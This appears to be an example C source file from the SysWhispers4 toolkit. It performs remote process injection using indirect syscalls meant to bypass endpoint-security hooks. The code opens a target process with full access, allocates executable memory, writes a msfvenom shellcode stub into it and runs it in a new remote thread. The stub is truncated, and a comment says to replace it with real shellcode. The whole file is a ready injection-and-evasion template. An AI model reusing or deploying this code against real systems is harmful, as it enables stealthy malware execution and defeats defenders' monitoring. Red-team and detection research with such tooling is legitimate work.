/*
 * SysWhispers4 — Example: Remote shellcode injection
 *
 * Generated with:
 *   python syswhispers.py --preset injection --method indirect --resolve freshycalls
 *
 * Compile (MSVC):
 *   cl /nologo /W3 example_injection.c SW4Syscalls.c SW4Syscalls.asm
 */
#include <stdio.h>
#include "SW4Syscalls.h"

/* msfvenom -p windows/x64/exec CMD=calc.exe -f c */
static const unsigned char shellcode[] = {
    0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xc0, 0x00, 0x00, 0x00,
    /* ... truncated for brevity — replace with real shellcode ... */
};

int main(void) {
    /* ----- Initialize SysWhispers4 (resolves SSNs via FreshyCalls) ----- */
    if (!SW4_Initialize()) {
        fprintf(stderr, "[!] SW4_Initialize failed\n");
        return 1;
    }

    DWORD targetPid = 4;  /* System process — change to target PID */

    /* ----- Open target process via syscall ----- */
    HANDLE hProcess = NULL;
    OBJECT_ATTRIBUTES objAttr = { sizeof(OBJECT_ATTRIBUTES) };
    CLIENT_ID cid = { (PVOID)(ULONG_PTR)targetPid, NULL };

    NTSTATUS status = SW4_NtOpenProcess(
        &hProcess,
        PROCESS_ALL_ACCESS,
        &objAttr,
        &cid
    );
    if (!NT_SUCCESS(status)) {
        fprintf(stderr, "[!] NtOpenProcess failed: 0x%08X\n", status);
        return 1;
    }
    printf("[+] Opened process %lu → handle 0x%p\n", targetPid, hProcess);

    /* ----- Allocate RWX memory in target process ----- */
    PVOID  remoteBase = NULL;
    SIZE_T regionSize = sizeof(shellcode);
    status = SW4_NtAllocateVirtualMemory(
        hProcess,
        &remoteBase,
        0,
        &regionSize,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE
    );
    if (!NT_SUCCESS(status)) {
        fprintf(stderr, "[!] NtAllocateVirtualMemory failed: 0x%08X\n", status);
        SW4_NtClose(hProcess);
        return 1;
    }
    printf("[+] Allocated 0x%llu bytes at 0x%p\n", (ULONG64)regionSize, remoteBase);

    /* ----- Write shellcode ----- */
    SIZE_T written = 0;
    status = SW4_NtWriteVirtualMemory(
        hProcess,
        remoteBase,
        (PVOID)shellcode,
        sizeof(shellcode),
        &written
    );
    if (!NT_SUCCESS(status)) {
        fprintf(stderr, "[!] NtWriteVirtualMemory failed: 0x%08X\n", status);
        SW4_NtClose(hProcess);
        return 1;
    }
    printf("[+] Wrote %llu bytes of shellcode\n", (ULONG64)written);

    /* ----- Change to RX (optional — good practice) ----- */
    ULONG oldProtect = 0;
    status = SW4_NtProtectVirtualMemory(
        hProcess,
        &remoteBase,
        &regionSize,
        PAGE_EXECUTE_READ,
        &oldProtect
    );

    /* ----- Create remote thread to execute shellcode ----- */
    HANDLE hThread = NULL;
    status = SW4_NtCreateThreadEx(
        &hThread,
        THREAD_ALL_ACCESS,
        NULL,
        hProcess,
        remoteBase,   /* StartRoutine */
        NULL,         /* Argument */
        0,            /* CreateFlags */
        0, 0, 0,
        NULL
    );
    if (!NT_SUCCESS(status)) {
        fprintf(stderr, "[!] NtCreateThreadEx failed: 0x%08X\n", status);
        SW4_NtClose(hProcess);
        return 1;
    }
    printf("[+] Remote thread created: handle 0x%p\n", hThread);

    /* ----- Wait for completion ----- */
    SW4_NtWaitForSingleObject(hThread, FALSE, NULL);

    SW4_NtClose(hThread);
    SW4_NtClose(hProcess);
    printf("[+] Done.\n");
    return 0;
}
